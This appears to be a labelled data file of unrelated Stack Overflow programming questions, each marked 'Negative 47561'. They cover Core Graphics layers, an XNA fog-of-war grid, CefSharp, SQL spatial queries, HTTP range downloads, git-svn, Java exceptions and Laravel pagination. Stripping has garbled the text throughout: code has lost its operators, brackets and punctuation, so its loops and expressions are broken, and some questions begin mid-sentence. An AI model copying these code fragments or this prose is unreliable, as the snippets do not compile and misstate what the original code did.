colorSpace  CGColorSpaceCreateDeviceRGB CGGradientRef gradient  CGGradientCreateWithColorscolorSpace,bridge CFArrayRef colors, NULL  CGLayerRef layer  CGLayerCreateWithContextcontext, CGSizeself.ledsize,self.ledsize, auxiliaryInfo NULL if layer      CGContextRef layercontext  CGLayerGetContextlayer     CGContextDrawRadialGradientlayercontext, gradient, ledctr,self.ledsize8,ledctr, self.ledsize2,kCGGradientDrawsBeforeStartLocation  else      NSLogdidnt get a layer   for int led0ledlt[self.ledinfoarray count]led      ledinfo[self.ledinfoarray objectAtIndexled]   the first time through selected1 and ledinfo.cglayernil for all circles,  so this branch is taken.     if ledinfo.selected  ledinfo.cglayernil          CGPoint startPointledinfo.rect.origin         CGContextDrawLayerAtPointcontext, startPoint, layer         CGContextAddRectcontext, ledinfo.rect         ledinfo.cglayerlayer   the second time through drawRect one or more circles have been deselected.

I think from what you are saying that there are two problemsp  p1  Reference counting doesnt work with CGLayerRef.  OK, but it would be nice to know that while writing code rather than after debugging.  What is my indication that when using things in Objective Ccocoa that resource counting doesnt workp  p2  You say that Im storing to a property, not an NSArray.  True, but the destination of the store is the NSArray via the property, which is a pointer.  The value does make it into the array and back out.  Does resource counting not work like this  ie instead of CGLayerRef, if I were storing some NSObject into NSArray using the code above would resource counting work  If not, then would getting rid of the intermediate ledinfo property and accessing the array directly from within the loop workp

Negative 47561 pFirst of all, Im working on a 2D strategy game, using XNA framework.p  pIm implementing a 2D fog of war for my game. The graphic part is already done and works pretty nicely, but im now trying to implement the logic part of this fog of war.p  pI created a 2D grid representing my level. Each frame, each unit updates cells in a circle around it, using Bresenhams algorithm which seems to be the best way to figure out which cells are in a given circle. This is actually working... When I want to know if a given position is visible or not, I just have to get the cells state...p  pThe problem is, when I have large amount of spawned units, my game is running so slowly... The first reason for this performance issue is that since every unit update the cells around it, lots of cells are updated multiple time... But I cant see any solution for this...p  pSo... Maybe I was wrong implement it this way, or maybe am I missing an obvious optimization, but Im kind of stuck...p  pHere is the codep  precodeclass LevelGridCell      public void SetVisiblefloat atime              if mvisibleTime lt atime             mvisibleTime  atime          public bool IsVisiblefloat atime              return mvisibleTime  0f ampamp mvisibleTime gt atime           float mvisibleTime  0   class LevelGrid      public LevelGridCell GetAtint ax, int ay              return mgrid[ax  ay  mwidth]           public void SetVisiblefloat atime, int ax, int ay, float aradius              GetAtax, ay.SetVisibleatime          int intRadius  intaradius  mcellSize         int x  0, y  intRadius, p  1  intRadius         PlotSetVisibleax, ay, x, y, atime         while x lt y                      x             if p lt 0                 p  2  x  1             else                              y                 p  2  x  y  1                          PlotSetVisibleax, ay, x, y, atime                   private void SafeSetVisibleint ax, int ay, float atime              if ax gt 0 ampamp ax lt mwidth ampamp ay gt 0 ampamp ay lt mheight                      GetAtax, ay.SetVisibleatime                   private void PlotSetVisibleint xctr, int yctr, int x, int y, float atime               for int i  xctr  x i lt xctr  x i                      SafeSetVisiblei, yctr  y, atime             SafeSetVisiblei, yctr  y, atime                  for int i  xctr  y i lt xctr  y i                      SafeSetVisiblei, yctr  x, atime             SafeSetVisiblei, yctr  x, atime                    ListltLevelGridCellgt mgrid  new ListltLevelGridCellgt     float mcellSize     int mwidth     int mheight  codepre

Negative 47561 pI was reading about Marshaling. and im confused because what does mean this in unmanaged code. HRESULT, DWORD, and HANDLE. The original text isp  blockquote   pYou already know that there is no such compatibility between managed and unmanaged environments. In other words, .NET does not contain such the types HRESULT, DWORD, and HANDLE that exist in the realm of unmanaged code. Therefore, you need to find a .NET substitute or create your own if needed.

Negative 47561 pI have a program that I want to display a window above the start screen in Windows 8. The only way to do that that I know of requires I set the flag uiaccesstrue in the manifest. But, in order for that to work, the user of the program needs to be an administrator. So, I tried a hrefhttpwww.codeproject.comArticles18367LaunchyourapplicationinVistaunderthelocals relnofollowthis methoda to get a service I install with the program to launch the main program. This way the any user can run the program once installed.p  pThe problem is the uiaccess flag. It seems that in order to launch a program as described in the article, but with uiaccess, the service itself needs to have the uiaccess flag enabled or else CreateProcessAsUser fails. And whenever I try to install the service with the uiaccess flag, I get the error this process requires elevation.p  pSo, the main question is Is there a way to install a service that has this flag enabled I admit that I expect the answer to be no. Since a service running in session 0 would normally have no reason to have this flag, since theres no ui component allowed. But, Im hoping that Im wrong and there is a way.p  pThank you, let me know if I need to clear up anything.p

Negative 47561 pSo let me start off by saying that I do not have the statistics toolbox for Matlab so I am trying to find a way to work around this.  In any case, what I am trying to do is to replicate the R codesamplecode function.  For example, in R p  precodegt x  sample15,20,replaceT,probc.1,.1,.1,.1,.6 gt x  [1] 5 5 5 4 5 2 5 5 1 5 5 5 5 5 5 3 5 1 5 5 codepre  pso I am sampling the integers 1,2,3,4,5 with replacement.  But furthermore, I am sampling each integer with a certain proportion, i.e., the integer 5 should be sampled about 60 of the time. p  pSo my question that I would like to find a solution to is how to achieve this in Matlabp

Negative 47561 pI am trying to find out if this is possible. I have been through the GitHub example a hrefhttpsgithub.comchillitomCefSharp relnofollowhttpsgithub.comchillitomCefSharpa which gave me the source code for the classes although I could not build CefSharp itself from this GITHUB. p  pI did however then try the binaries download from this link a hrefhttpsgithub.comdownloadsatarantoCefSharpCefSharp1.19.0.7z relnofollowhttpsgithub.comdownloadsatarantoCefSharpCefSharp1.19.0.7za and then I built my C win32 app by referencing these examples, this went reasonably smoothly and after 8 hours or so I have got a working embedded browser, yipeee. However, I am now at the point where I want to manipulate the DOM  I have read that you can only do this with webView.EvaluateScriptsome script and webView.ExecuteScriptsome script as direct DOM access is not available through cefsharpp  pSo what I am trying to find out is. Can I call jQuery methods If the page I have loaded already has jQuery loaded, can I do the following in cp  precodewebView.ExecuteScriptinputsomeid.valuserexample.com codepre  pCurrently this throws an exception. I am trying to find out should I even be trying to use jQuery from the cefsharp DLL, or do I have to stick to standard old school JavaScript that will take me 5 times as long to write...p  pI am hoping a stacker will have an answer. I have tried the wikis and forums for cefsharp but they do not offer much in the way of leads and the only examples I have found are of old school JavaScript.p

Negative 47561 pIve been stabbing at this for a while and am getting nowhere, so Im hoping that someone with greater skills than I might have the answer.p  pI have two tables and in one is a set of latitude and longitude coordinates as separate columns.  In the second able I have polygon shapes set in to a spatial geometry column.p  pThe goal is to select all of the latitude and longitude pairs from table 1, which might be called separately asp  pSQLSTRING  SELECT LAT,LONG FROM dbo.Table1p  pThe second table can be called using a scripting language loop to parse through each result one by one by using the following queryp  pSQLSTRING  SELECT  FROM dbo.Table2 a WHERE a.POLY.STContainsgeometrySTPointFromTextPOINT amp Text Longitude Value from Table 1 amp   amp Text Latitude Value from Table 1 amp ,01p  pSo, my dilemma is that it surely would be possible to select all items from Table 1 and run them through a query that will only return those results where the latitude and longitude from table 1 are contained within any specified polygon stored in table 2.  The scripting language loop is so obviously inefficient, so a single SQL query that could replace this and just return any matches would be a major time and resource saver.p  pAny help or pointers would be most gratefully appreciated.  Thank you, in advance, for your advice.p

Negative 47561 pI am building a responsive website and have been testing it on my iphone 5 as im building it. The page is rendering fine. I was just curious if there is a script, plugin or solution to make the page scroll top to bottom fast like when you flick up and down on an app  lets say like facebook, etc I know an app and a website page are 2 different things. It just seems that when I try to do that on a page I am building, it is much slower and stops scrolling quickly. Is there a solution to have that fast, smooth scrolling It would add nicely to the mobile experience for the visitor. Im sure content, images, etc puts a drain on the browser but I was hoping there is a way to do this.p  pThanksp

Negative 47561 pI am trying to write a class that takes a phone number that the user inputs as a string, then stores each digit in an array. I converted the string to a long using Long.parseLong.

Negative 47561 pI am Using Laravel 4p  pI am trying to paginate an Eager Loaded Constraint, essentially I have a Topics Model which has a emhasManyem relationship to a Comments Model. This is all well and good and no problems with that. However I would like to be able to display a paginated table of the Comments of which there will be hundreds on the admins edit topic view. To do this I thought I would use the following codep  precodetopic  Topicswith array comments gt functionquery              querygtorderbycreatedat, DESC         querygtpaginate10        gtwhereid, id gtfirst codepre  pNow this will provide me codetopiccode with the correct object and inspecting codetopicgtcommentscode shows it has the correct linked comments and is limited to 10 results. The pagination also responds to the codeGETcode page parameter and will paginate, however trying to echo codetopicgtcommentsgtlinkscode results in an error of method not found. p  pMy work around for this is to have a second query which counts the attached comments and then using the following in my viewp  precodepaginator  Paginatormaketopicgtcommentsgttoarray, commentCount, 10 echo paginatorgtappendsarraytab gt commentsgtlinks codepre  pIs this a bugp

Negative 47561 pI recently inherited a large mobile application, and one of the things Im looking to improve is its installationupdate process. Right now, company policy is, whenever a new version is released, we released a new CAB file and its manually copied to each of the PDAs it runs on. This also includes manually copying CAB files for SQL Server Compact and Compact Framework 3.5. p  pIm replacing this with a little bootloader application, which will check with our server for things like updates in the application, but will also check if the compact framework and SQL Server compact are installed and if not, will get the CAB files from the server and install them. A lot of newer Windows Mobile 6.5 devices come with the Compact Framework 3.5 installed, but not all of them. I want this bootloader to run on pretty much any device, so with that in mind, would it be more reliable to do this in native code c or Compact Framework 1.0 Are there some devices that just dont come with CF at allp

This pushes my content to the left, which is desired, and introducing a span3sized gap at the right side, which is not.p  pI cant change code.span9code to code.span12code inside CSS codescreen printcode and defining my own class with dependent width copied from Bootstraps code.span9code and code.span12code feels icky, as I feel as if Im invading Bootstraps space. So Im kind of stumped what would be the best option.p  pHow can I hide my codenavcode and resize the content accordinglyp

Ive compiled with success a simple code including only printf commands Ive done it in two ways with the procopen function and the shellexec. Now, for the next step I have to find how to execute a scanf command. When i try a scanf command, the browser stops responding. This is expected as the c program running in the background is waiting for an input to be given without letting me enter one. I cant find how to manage this issue. br Any ideas for the direction I should follow are welcomebrbr EDIT Its done. In case someone needs something similar, I used procopens pipes[0] where stdin is stored to send my data.p

Negative 47561 pSay I want to download a file on a http server which supports segmenting downloading, making use of range header. For examplep  ul liurl to the file www.music.comrock.mp3li lilength of file 4000 bytesli ul  pSay I launched two threads and each is downloading half of bytes of file.p  ul lithread t1 downloads bytes from 0 to 1999li lithread t2 downloads bytes from 2000 to 3999li ul  pSay that t2 finished downloading the later half, and t1 only downloaded up to bytes 1199 yet, so t1 still has bytes 1200 to 1999 to go, which is 800 bytes in total.p  pNow I let t2 start downloading from byte 1600 to byte 1999, and I want t1 keep downloading up to bytes 1599. I see no problem of doing this with t2, I just need to send another get message with range from 1600 to 1999. But t1 originally sent get message from range 0 to 1999, not from 0 to 1599, so the server will keep sending bytes to t1 until the byte 1999 is delivered anyway, which in t1s perspective include redundant bytes from 1600 to 1999..p  ol lipSo for t1, is there any way to tell the server that, ok plan changed, I only need up to 1599, so stop at the point when you sent 1599, dont send bytes from 1600 One workaround that I can come up with is just letting t1 discard any bytes from byte 1600 to 1999, but these bytes are still being delivered over the wire, so they still consume the bandwidth and affect the network throughput, and its not what I want... I am trying to design a dynamic segmenting scheme to boost up the downloading speed, so thats why I am concerned with speed and throughput here. I imagine if its a large file, say maybe 1gigabytes, and using two threads, then in a worst case, the redundant bytes I have to discard would be around half of a gigabyte and thats a lot... One person mentioned simply terminating the connection. I wonder, when the server heard the connection closing request from me, will the server instantly stop sending any more unsent bytes in the requested range, like bytes 1678, 1830 etc.  I know that before server actually hears the connection closing request, it might still send couple redundant bytes well discarding that much byte is not a big issue though.pli lipIs there any other ways to make dynamic segmentation work, other than what I have so farpli lipIn above scenario, when t2 finished its job from 2000 to 3999 and about to grab bytes from 1600 to 1999, will t2 use the same http connection to grab new range of bytes by default or I should do something beforehandfor example, sending extra argument to GET message etc. to make it happen And am I right that in such case, using same connection is better than closing and opening another connectionpli ol  pI am writing this in clojure, so if you have any code example in java or clojure, that would be really helpful. p

Negative 47561 pI think I have a novel question that, try as I might, I have been unable to solve. I have been using this site for several months to learn R and have been able to solve all of the questions Ive had up until now. I am doing a large retrospective cohort study and lets just say our sample looks something like thisp  precodemy.df lt data.frameID  samplec1,2,3, 10, replace  TRUE,                     Date  seqas.Date20120801,                                as.Date20121101, 1[sample110, 10],                      ICD  c 401.3, 401.3, 250.02, 250.02, 110.1,                              110.1, 250.02, 250.02, 250.02,112.1 codepre  pWhat I need to do is select the IDs that have a specific diagnosis lets say 250.02 on two consecutive visits. In order to go about doing this, I used code similar to thisp  precodemy.dfltwithmy.df, my.df[orderID,as.DateDate, ] codepre  pto organize the data based on date then group by ID. My next step, I think, is to either write a loop function or write a function with ddply to select out consecutive dates with the same ICD code. The first problem is Im working on crappy computers with a VERY large data set and Im afraid a loop function will be so memory intensive the computers will either freeze or crash. The second problem is that up until now, I have worked mostly by vectorized data to get by and my loopfunction programing skills are lacking at best. Any suggestions on how to efficently solve this problem would be appreciated. p

Negative 47561 pWhen i publish the .apk on Google Play it says 0 devices supported. And on the bottom of the apk description its written Native Platforms actionbarsherlock, SherlockNavigatorDrawer. These are the libraries i used for my project. They are not .jars, they are folders i put into the libs folder of the app. The problem is this Google Play considers these two libraries as Native Platforms Im not sure what it exactly means or is, and this causes a filtering in the support of devices. Im thinking about what can be the causes of this. My project is a collaboration with a friend and the project has been runned and builded several times with eclipse and exported to Aide Aide is an app that allows you to develop apps with your tablet. Maybe this is only a path problem or... I have the libraries on my lib folder of Aide and i have built the apk there, but maybe some path or something else about libraries remained the ones of eclipse maybe in eclipse we didnt put the libraries inside the libs folder.p

Negative 47561 pI have a Grails application that is running in Tomcat 7 under IIS 7, using the Jakarta Isapi Tomcat connector version 1.2.30 and Im having trouble getting the error handling to behave how Id like. The Tomcat connector is configured in codeuriworkermap.propertiescode to forward all requests below the applications URL to Tomcatp  precodeOrderSubmission  worker1 codepre  pThe Grails application has its own custom error pages which work fine when the application is running on a development machine without IIS  the Tomcat connector, but when on the server, if custom error pages are switched on in IIS, these always override the ones in the Grails application. This means that where I have a specific page to handle a certain exception type, e.g. in codeUrlMappings.groovycodep  precode500controller error, action itemNotFound, exception ItemNotFoundException codepre  p...Im instead seeing the static 500 error page that Ive pointed IIS at. p  pIf I instead turn on detailed errors in IIS I get the correct error pages through from my Grails application  however, if a request is made for a URL outside of the applications context, I then see the detailed IIS 404 page, which is unacceptable. If I change the Tomcat connectors codeuriworkermap.propertiescode to include everything from the root downwards then I instead see a default Tomcat 404 error page. Ive tried getting the Tomcat connector to default to custom pages by setting the codeerrorpagecode option in codeisapiredirect.propertiescode to point to my IIS static custom pages like sop  precodeerrorpaged.htm codepre  p...but this doesnt work, and I cant find any example of using this setting anywhere. p  pWhat I need to happen is for the custom Grails error pages to be shown  unless the URL being requested is outside the application or the application is down, at which point I need custom static error pages to be shown. p  pHas anyone managed to achieve this p  pTIAp

Negative 47561 pEven though working on PHP for so long,  recently came to know about long polling, otherwise I was sending periodic ajax. p  pIt is understood that sending periodic ajax consumes bandwidth  Considering the case if site have thousands of users.

Negative 47561 pOne of the projects I work on uses a SVN repository to manage its code.  I would like to use Git for version control on all of my machines, as well as be able to host a copy of the repository on GitHub.  I have a graphic depicting how I would like things to be setup or merged, but I cant post it yet.p  pIve managed to use codegit svn clonecode to clone the SVN trunk to my machine, and can then use Git to branch locally, but when I tried to merge the changes from my development branch back into master so that I could codegit svn dcommitcode them I received the following errorp  blockquote   pUnable to determine upstream SVN information from HEAD historyp blockquote  pI then tried to undo the merge and codegit svn rebasecode and I received this errorp  blockquote   pUnable determine upstream svn information working tree historyp blockquote  pClearly I am doing something incorrectly, but I cant seem to find any information on how to correct these errors that works.  As well, the posts I do find on the subject offer no advice on how to avoid ending up in the same situation again in the future.p  pSo, thats what Ive managed to do incorrectly.  There are also several things I havent managed to do at all when trying to bridge the SVN repo and my local Git clones.  The first of which is tracking only one of the many branches present in the SVN repo.  Most of the branches there I dont care about, so I would like to avoid the overhead of syncing with all of them.  What is the proper way to tell Git to track an individual SVN branch  If a new branch is added to the SVN repo after I have done my codegit svn clonecode will I be able to start tracking itp  pLastly, I would like to be able to host a copy of my Git repo on GitHub and then use that to synchronize my development work between my machines.  On my first attempt at this it seemed that none of the SVN related information got pushed to the GitHub repository.  When I cloned the repo from GitHub to a new machine and then attempted to run codegit svn rebasecode it failed.  Is there a way to have the necessary SVN info pushedcloned properly by Git, or will I have to readd the SVN referencese and metadata on each machine after Ive cloned the Git repositoryp  pThanks in advance for everyones help.p

Negative 47561 pstrongIm trying to understand how to properly define interfaces in Java with respect to how exceptions are treated in the language and runtime.strongp  pNOTE emPerhaps this question has already been asked and adequately answered, but my search of SO and other sites didnt turn up anything that directly addressed the design question and the tradeoffs I present. Ill happily delete this question if an analogous one can be found that answers my question. I apologize in advance for the longwinded question, but I wanted to state the problem as clearly as possible. Im also aware of the a hrefhttpdocs.oracle.comjavasetutorialessentialexceptionsruntime.html relnofollowcontroversy around checked exceptionsa, but since I am not in a position to change the language and must still work within it, Id like to select the approaches that will cause the least pain in the long term.emp  pThe recurring problem I encounter is when I try to define my own interfaces I am faced with the choice of how to specify which if any exceptions are allowed to the members of the interface. The trouble is that I have no way of knowing which exceptions are meaningful, since I dont know ahead of time what all of the possible implementations for my interface might be. For the sake of an example, suppose we have the following interfacep  precode purely hypothetical interface meant to illustrate the example... public interface SegmentPartition       option 1     bool hasSegmentSegment s      option 2     void addSegmentSegment s throws Exception      option 3     bool tryAddSegmentSegment s throws TimeoutException, IOException, ParseException, XmlException, SQLException      option 4     void optimizeSegments throws SegmentPartitionException  codepre  pWhat exception types should this interface declare upfront The options I see arep  ol lidont declare any exception, implementations can only throw codeRuntimeExceptioncodesli lideclare each method as throwing codeExceptioncodeli litry to anticipate every possible exception type that makes sense for this interface and declare them as the throwable exceptions.li licreate my own exception type e.g. codeSegmentExceptioncode and require that it be thrown with an inner exception as needed for additional detail.li ol  pstrongThere are problem with each of these approaches, and its not entirely clear what all of the tradeoffs are likely to be, Ive mentioned a few for each case. Ideally, I dont want any exceptions to be thrown by the implementation, but thats not always a practical restriction.strongp  pFor strongoption 1strong, the trouble is that many of the exception types that may be thrown are not derived from RuntimeException for instance IOException or TimeoutException. I could, of course, add these specific exceptions to the interface and then allow other RuntimeExceptions to be thrown as well, but what about userdefined exceptions then This seems like a poor option.p  pWith strongoption 2strong we end up with an interface that seems like it could result in any exception whatsoever which I suppose is true, and provides no guidance to implementors on what should actually be thrown. The interface is no longer self documenting. Worse yet, every call site of this interface must either be declared as throwing Exception or wrap each call to methods of this interface in codetry catchExceptioncode, or create a block that catches Exception and tries to suss out whether it was thrown by the interface implementation or something else in that block. Yuck. Alternatively, the code that uses this interface could catch the specific exceptions that the implementations might throw, but then it violates the purpose of having an interface to begin with in that it requires the caller to know the runtime type of the implementation. In practice, this is the option closest to what most other languages I know take with regards to exceptions C, C, Scala, etc.p  pWith strongoption 3strong I must specifically anticipate the potential implementations that could be defined for my interface, and declare the exceptions most appropriate for them. So if I anticipate that my interface may be implemented over a remote, unreliable connection I would add TimeoutException, if I anticipate it may be implemented using external storage I would include IOException, and so on. I am almost certainly likely to get it wrong ... which means that I am going to continually churn the interface as new implementation paradigms surface which, of course, breaks all existing implementations and requires them to declare nonsensical exceptions as being thrown. A further problem with this approach is that results in ugly, repetitive code ... particularly for large interfaces with many methods yes, sometimes these are needed which then need to be repeated at each implementation point.p  pWith strongoption 4strong I must create my own exception type, together with all of the baggage that accompanies that serializability, nesting and inner exceptions, coming up with a reasonable hierarchy, etc. What seems to inevitably happen here is that you end up with one exception type for each interface type  InterfaceFoo  InterfaceFooException. Aside from the code bloat this entails, the real problem is that the exception type doesnt mean anything ... its just a type used to bundle together all of the error conditions for the particular interface. In some cases, perhaps, you can create a few subclasses of the exception type to indicate particular modes of failure, but even that is questionable.p  pstrongSo what is the right thing to do here, in generalstrong I realize there may not be a cut and dry rule, but Im curious about what experienced Java developers choose do.p  pThanks SO.p

Negative 47561 pWhen working with database modeling tools that are capable of generating code, there are certain relationship types which are almost never supported.p  pThey include 1to1, manytomany, and 0 or 1to0 or 1. 11, emem, and 0..10..1.p  pThe first two have easy solutions.p  ol lip1to1 can be resolved by converting to 0..1to1 or 1to0..1, 0..11 or 10..1.pli lipManytomany can be resolved by using a table in the middle of the relationship and then either a 1 and a em1 or a 0..1em and a 0..1 or some similar combination. I think there are four possible combinations that resolve it.pli ol  pHowever, I am stuck on 0..1to0..1. In fact, I have such a set of tables that seem to have this logical relationship.p  pIn my case I have four tables. For the sake of argument, suppose they all have primary keys of type INT. The tables are People, Organizations, Customers, and Employees.p  pA word about the logic. Organizations can have People, they are called Contacts in the relationship. People can be either a Customer or an Employee or both.p  pOrganizations lt has Contacts lt as People. This is a 0..1 relationship. This means that a Person can exist with or without an Organization and that an Organization can have many People or none.p  pAn Employee must have a Person record, and that relationship also makes sense. It is a 0..11 relationship, where an Employee must have a Person, but a Person can have 0 or 1 Employee record.p  pBut this one doesnt make sense because the entity inheritance flows in both directions, logically. In the case of People or Organizations to Customer. A Customer can be either an Organization or a Person, but not both, and the selection is made via a Type flag field. Just the same a Person is not necessarily a Customer, it may be an Employee or some other contact type later on. I can not require a Person to be a Customer and I can not require a Customer be a Person. Just the same I can not require an Organization to be a Customer and I can not require a Customer to be an Organization. So the disconnectedness of the inheritance is also necessary. In the case of both CustomerPerson and CustomerOrganization, they both need to implement a 0..10..1 and 0..10..1. But the language tools do not support it. Because they are stronglytyped languages, the entity inheritance can only flow in a single direction. Even in weaklytyped languages, you would still wind up in a situation of which came first the chicken or the egg.p  pJavaScript is perhaps wellsuited for this case since you can dynamically alter the structure of an object type, and you could always combine the two structures in either order even if you couldnt explicitly declare the object to exist in this manner.p  pBut my tool for today is Microsoft LightSwitch, and it wont do this at all. I dont think a modern modeling tool exists that will and generate stronglytyped language code that will permit this relationship type.p  pIs there a trick that overcomes this relationship, 0..10..1, or is there something fundamental that I have yet to understand I am left here to pick a side, and I dont know which side is winning Customer or Person, Customer or Organization. But maybe there is something else I can do without compromising either case. Is there something about the model that is brokenp  pThanksp

So, signature protection level is p  blockquote   pA permission that the system grants only if the requesting application   is signed with the same certificate as the application that declared   the permission.

Negative 47561 pI am currently designing a library.  This library presents UI elements that target other elements already drawn on the screen.  It does this by passing in a View object.

Negative 47561 pFor a wordbuilding game Im working on, I have a trie that stores every possible word from a dictionary. Thats about 179,000 at the moment.p  pThe way the game works, theres a 5x5 or possibly larger in the future, depending on how efficient the solution to this question turns out to be grid of letters. The player and the PC take turns making words from those letters, getting points based on the letters and length of the words the letter valuations are similar to Scrabble, but thats not important. Whenever a player makes a word, those letters are removed from the board, and this continues until no words can be made, at which point the grid is reset and the winner of the round gets a bonus.p  pThe question is this given a 5x5 grid of letters and that dictionary trie, how can I efficiently determine either the longest word that can be made or a list of all possible words Note that the letters dont need to be touching each other to be used any of the grids letters are fine.p  pThe only way I can think is to essentially do a BFS on the trie, pruning it when the next letter isnt in the grid, but that doesnt seem very efficient to me as itd have to be tried for each letter in the grid. Is there a better way to do thisp

Negative 47561 pFor my current project, Im creating a 2D fighting game using P3D, using sprites for the characters. While setting it up, I only am trying to display one character on screen, so my current setup is p  pI have one parent class called Fighter, which contains values for the location in the world and booleans determining what the fighter is currently doing. Then I have class called Animation which extends Fighter. This is where the sprites are stored, and I think where the NPE originates. The class has a constructor where a larger PImage is cut up into smaller frames and stored in an array for each animation. p  pThis larger PImage contains 192 frames. The game was originally based off of dragonball, so the plan was to have the character charge up and transform past a certain point  the 3 transformation groups are stored on top of each other on the sheet. Within those groups are the animation sets for actions  punching, kicking, idle, moving, etc. each collumn is a frame, and each animation contains four frames 4163.p  pThe trouble stems, I think, from cutting the larger PImage up and storing the individual frames for that animation within an array. I managed to get this working in an earlier version, but I used states, and stored the whole PImage 192 frames within a single array, and called the rows by state. The end result of all that was that it took extremely long and complicated code to display 2 characters on screen, be it the same or different. p  pthe entire sketch can be found here, images and all a hrefhttpsmega.co.nzkRYUBYbIwNRvKNo54BpAc4QbWZpEuoHJoJJcBkGmRK9rSgoIGu4 relnofollowhttpsmega.co.nzkRYUBYbIwNRvKNo54BpAc4QbWZpEuoHJoJJcBkGmRK9rSgoIGu4ap  por here is the Animation class, containing the code used to cut up the sprite sheet.p  pre classlangjava prettyprintoverridecodeclass Animation extends Fighter    PImage [] playerFrames    int count, currentFrame  0      Animationint startX, int startY   constructor     for int x  0 x lt 4 x        playerFrames[x]  gokuSpriteSheet.getx90  startX, startY, 90, 85          Animation    int cx  currentFrame  4  1  currentFrame    void display       if count gt 7        count  0       currentFrame       if currentFrame gt 4          currentFrame  0           imageplayerFrames[cx], x, y      void display    class AnimationSet     Animation idleRight  new Animation0, 0   Animation idleLeft  new Animation0, 85   Animation moveRight  new Animation0, 170   Animation moveLeft  new Animation0, 255   Animation jumpRight  new Animation0, 340   Animation jumpLeft  new Animation0, 425   Animation punchRight  new Animation0, 510   Animation punchLeft  new Animation0, 595   Animation kickRight  new Animation0, 680   Animation kickLeft  new Animation0, 765   Animation blockRight  new Animation0, 850    Animation blockLeft  new Animation0, 935   Animation kiAtkRight  new Animation0, 1020   Animation kiAtkLeft  new Animation0, 1105   Animation chargeRight  new Animation0, 1190   Animation chargeLeft  new Animation0, 1275   AnimationSet [] powerStates codepre  pThe ideal end result would be a sketch that starts up on a generic menu, allows you to select the world and yoursyour opponents characters, and then finally creates all those objects once you click proceed. Im still not familliar with certain techniques used in this language, so I dont think some of that will be possible, but Im hoping to duplicate the animation class 4 times over for each character skin, then create a player and target object of each. Ill then create an integer, let you change it in the menu, and based on the selected choice, use if statements to run the object functions in draw.p  pSo, finally, on to my question  How do I cut up the larger PImage I have and store 4 frames without invoking a NPE Do I need to change the sprite sheet itself into individual images of four frames for each action, and pass the filename of each as a string when the Animations are being constructed Any other suggestions for solutions, bearing in mind that Im trying to display 2 characters on screen, from a selection of four they can be the samep  pThanks in advance for any suggestions, I did search around but nullPointerException strikes me as a very common and vague error, and I couldnt find an example that helped me out.p

Negative 47561 pI am trying to test the routing mechanism of my app which is a Laravel PHP App that was based on the documentation a hrefhttplaravel.comdocsroutingrouteprefixing relnofollowhttplaravel.comdocsroutingrouteprefixinga.

Negative 47561 pI have some TSQL code that produces a denormalized flat file from nicely organized relational tables. The code completes quickly, and the data isnt overwhelming, so chances are any suggestions would help. I dont have to worry much about performance because this process is only intended to be run 1 time a month. I have some wiggle room in that respect.p  pThe source data, for examples sake, is laid out like this One person table 1 can have many incidents table 2. Each incident can have many codes tied to it table 3. Each code has an ordered sequence. So after flattening this out, one row in the extract file may look like thisp  precodeName                IncidentId  Code1   Code2   Code3   Code4 Sue Ellen Crandell  1991        abc1    def1    xyz0    888 codepre  pThese denormalized ordered code columns could potentially go out to over 50. The problem is, that there is a new requirement that if one of the ordered code columns has a value thats in the list of exclusions, then the following ordered code column values should be shifted forward one position. This means that if codedef1code was in the exclusion list, the row should look like thisp  precodeName                IncidentId  Code1   Code2   Code3   Code4 Sue Ellen Crandell  1991        abc1    xyz0    888     ltempty stringgt codepre  pBefore I fetch additional relational data and export the results to the file, I use dynamic TSQL to denormalize these ordered code values into a temp table. Due to not wanting to mess with the dynamic TSQL, and probable limitations with being able to use conditionals to shift the columns during that part of the process, Im thinking that the easiest place to put the exclusion list evaluation would be after the ordered code values make it into the temp table.p  pIf I have a temp table that looks like the first data row above, how can I p  ol liCheck each column value.li liRemove the value if it is included in the exclusion listli liConditionally shift values forward when encountering a value in an exclusion list, as shown in the row examples above li ol  pThe exclusion list is just a handful of static values that I can either dump into a temp table or use with an codeINcode operator.

Negative 47561 pI am involved in a computation that allocates about 1TByte of data in main memory. I need to understand how much memory access patterns can affect the bandwidth to the processor.p  pFor example I read that an Intel Xeon processor can support a memory bandwidth of 65GBytessec. Does this mean that this bandwidth will be achieved under all memory access patterns or only under optimal access patternsp  pI know that on each request for data to main memory a whole cache line 64 Bytes is pulled in. I consider the memory access pattern optimal, if on each request the entire cache line is used before the next request is issued. The worst case would be if on each request only one double 8 Bytes is used before the next request is issued.p  pSuppose I know that on each request on average out of the 8 doubles that come in I will be using only f1,2,...,8 of these before the next request is issued. Is there an easy way to  compute the actual bandwidth I will get as a function  of fp  pThanks in advance for all repliesp

Negative 47561 pI have several classes with the same abstract base and the same schema, referring to similar tables in the database.

Negative 47561 pI am working on a C WebApiMVC project that has a rather large workflow process for creating a user and placing in their required information. There is about 10 major steps involved, in which it could technically take a user hours to fill out.p  pThe first step takes standard basic information such as username, password, email, name, address etc. p  pWhat I would like to do is after this first step is successful, send a rest call that will create the basic user in the user table, and then prepare a session for the further steps in which when any field is filled out in the next steps, it will automatically send an ajax call and update the field in the database.p  pWhile this all sounds easy and simple in theory with the use of sessions, which I could do in MVC, I want to do this in WebApi with REST in which REST is supposed to be STATELESS. p  pHas anyone come across similar issues, and if so what do they recommend as an approach The options I can currently think of arep  pDitch the REST for standard MVC for this process and leave WebAPI for only Reads instead of Writes as the only Write process is the inital creation of usersaccounts.p  pUsing Authentication tokens But can this handle this process successfullyp  pOnce the user is created, take the usernamepassword for every REST call as the auth to the WebAPI Store the UserPassword in MVC session and directly call the API from MVC, mobile applications would just store the usernamepassword in the application and call the WebAPI I think this is the most appropriatep  pCan anyone tell me if any of those options are the best practice, or does anyone have a better best practiceprocess for these things I would prefer to write things once to cover Web and Mobile as much as possible rather than having to duplicate processes.p  pThanks in advancep

